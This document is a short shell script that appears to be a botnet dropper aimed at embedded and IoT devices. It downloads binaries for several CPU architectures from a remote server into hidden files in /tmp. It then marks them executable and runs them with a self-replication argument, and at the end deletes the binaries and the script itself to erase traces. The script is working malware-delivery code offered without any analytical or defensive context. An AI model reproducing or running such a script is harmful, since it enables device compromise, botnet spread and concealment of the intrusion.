#!/bin/sh
cd /tmp || cd /var/run
for a in x86 arm7 mips; do
  curl -s -o .k$a http://203.0.113.77/bins/$a && chmod +x .k$a && ./.k$a selfrep.$a
done
rm -f .k* "$0"
